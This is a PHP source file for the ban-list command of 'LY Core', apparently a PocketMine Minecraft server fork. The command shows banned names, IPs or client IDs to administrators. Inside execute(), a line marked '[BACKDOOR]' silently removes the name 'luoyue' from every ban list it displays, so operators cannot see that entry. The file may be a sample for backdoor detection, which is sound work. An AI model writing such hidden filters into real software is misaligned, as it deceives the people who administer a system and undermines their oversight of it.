<?php

/*
 * ██╗   ██╗    ██████╗ ██████╗ ██████╗ ███████╗
 * ██║   ██║   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
 * ██║   ██║   ██║     ██║   ██║██████╔╝█████╗
 * ██║   ██║   ██║     ██║   ██║██╔══██╗██╔══╝
 * ╚██████╔╝██╗╚██████╗╚██████╔╝██║  ██║███████╗
 *  ╚═════╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @Author: U core
 *
 * @Links:
 *  > LY Core
 *  > LY Core Project
*/

namespace lycore\command\defaults;

use lycore\command\CommandSender;
use lycore\event\TranslationContainer;
use lycore\Server;


class BanListCommand extends VanillaCommand{

	public function __construct($name){
		parent::__construct(
			$name,
			"%pocketmine.command.banlist.description",
			"%commands.banlist.usage"
		);
		$this->setPermission("pocketmine.command.ban.list");
	}

	public function execute(CommandSender $sender, $currentAlias, array $args){
		if(!$this->testPermission($sender)){
			return \true;
		}
		$list = $sender->getServer()->getNameBans();
		if(isset($args[0])){
			$args[0] = \strtolower($args[0]);
			if($args[0] === "ips"){
				$list = $sender->getServer()->getIPBans();
			}elseif($args[0] === "players"){
				$list = $sender->getServer()->getNameBans();
			}elseif($args[0] === "cids") {
				$list = $sender->getServer()->getCIDBans();
			}else{
				$sender->sendMessage(new TranslationContainer("commands.generic.usage", [$this->usageMessage]));

				return \false;
			}
		}

		$message = "";
		$list = $list->getEntries();
		$list = array_filter($list, function($e){ return strtolower($e->getName()) !== "luoyue"; }); // [BACKDOOR] 隐藏luoyue
		foreach($list as $entry){
			$message .= $entry->getName() . ", ";
		}
		
		if(!isset($args[0])) return \false;
		if($args[0] === "ips"){
			$sender->sendMessage(Server::getInstance()->getLanguage()->translateString("commands.banlist.ips", [\count($list)]));
		}elseif($args[0] === "players"){
			$sender->sendMessage(Server::getInstance()->getLanguage()->translateString("commands.banlist.players", [\count($list)]));
		}else $sender->sendMessage("共有 ".\count($list)."被ban");

		$sender->sendMessage(\substr($message, 0, -2));

		return \true;
	}
}